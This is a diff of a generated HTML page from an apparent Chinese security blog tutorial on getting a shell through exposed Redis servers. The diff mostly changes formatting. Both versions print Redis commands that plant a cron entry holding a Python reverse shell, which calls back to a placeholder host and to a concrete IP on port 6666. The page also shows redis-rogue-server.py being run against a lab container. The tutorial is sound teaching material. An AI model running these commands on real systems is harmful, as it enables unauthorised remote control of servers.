@@ -146,15 +146,15 @@
 </span><span class="lnt">8
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">127.0.0.1:6379&gt; config <span class="nb">set</span> dir /var/spool/cron/crontabs
-OK
-127.0.0.1:6379&gt; config <span class="nb">set</span> dbfilename root
-OK
-127.0.0.1:6379&gt; get <span class="m">1</span>
-<span class="s2">&#34;\n* * * * * /usr/bin/python -c &#39;import socket,subprocess,os,sys;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&#34;IP\&#34;,6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&#34;/bin/sh\&#34;,\&#34;-i\&#34;]);&#39;\n&#34;</span>
-127.0.0.1:6379&gt; save
-OK
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">127.0.0.1:6379&gt; config <span class="nb">set</span> dir /var/spool/cron/crontabs
+</span></span><span class="line"><span class="cl">OK
+</span></span><span class="line"><span class="cl">127.0.0.1:6379&gt; config <span class="nb">set</span> dbfilename root
+</span></span><span class="line"><span class="cl">OK
+</span></span><span class="line"><span class="cl">127.0.0.1:6379&gt; get <span class="m">1</span>
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;\n* * * * * /usr/bin/python -c &#39;import socket,subprocess,os,sys;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&#34;IP\&#34;,6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&#34;/bin/sh\&#34;,\&#34;-i\&#34;]);&#39;\n&#34;</span>
+</span></span><span class="line"><span class="cl">127.0.0.1:6379&gt; save
+</span></span><span class="line"><span class="cl">OK
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>而这种方式是通过写文件来完成 GetShell 的，这种方式的主要问题在于，redis 保存的数据并不是简单的 json 或者是 csv，所以写入的文件都会有大量的无用数据，形似</p>
 <div class="highlight"><div class="chroma">
@@ -164,10 +164,10 @@ OK
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">[padding]
-* * * * * /usr/bin/python -c &#39;import socket,subprocess,os,sys;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&#34;115.28.78.16\&#34;,6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&#34;/bin/sh\&#34;,\&#34;-i\&#34;]);&#39;
-[padding]
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[padding]
+</span></span><span class="line"><span class="cl">* * * * * /usr/bin/python -c &#39;import socket,subprocess,os,sys;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&#34;115.28.78.16\&#34;,6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&#34;/bin/sh\&#34;,\&#34;-i\&#34;]);&#39;
+</span></span><span class="line"><span class="cl">[padding]
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>这种主要利用了 crontab、ssh key、webshell 这样的文件都有一定容错性，再加上 crontab 和 ssh 服务可以说是服务器的标准的服务，所以在以前，这种通过写入文件的 getshell 方式基本就可以说是很通杀了。</p>
 <p>但随着现代的服务部署方式的不断发展，组件化成了不可逃避的大趋势，docker 就是这股风潮下的产物之一，而在这种部署模式下，一个单一的容器中不会有除 redis 以外的任何服务存在，包括 ssh 和 crontab，再加上权限的严格控制，只靠写文件就很难再 getshell 了，在这种情况下，我们就需要其他的利用手段了。</p>
@@ -180,8 +180,8 @@ OK
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">docker search redis5
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">docker search redis5
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p><img
         class="lazyload"
@@ -196,16 +196,16 @@ OK
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">docker pull damonevking/redis5.0
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">docker pull damonevking/redis5.0
+</span></span></code></pre></td></tr></table>
 </div>
 </div><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">docker ps
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">docker ps
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p><img
         class="lazyload"
@@ -262,8 +262,8 @@ OK
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">python3 redis-rogue-server.py --rhost 172.18.0.2 --rport <span class="m">6379</span> --lhost 172.18.0.1
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 redis-rogue-server.py --rhost 172.18.0.2 --rport <span class="m">6379</span> --lhost 172.18.0.1
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p><img
         class="lazyload"
@@ -310,7 +310,7 @@ OK
 </div>
 </article></div>
             </main><footer class="footer">
-        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Geekby</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Geekby</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
         </div>
     </footer></div>
 
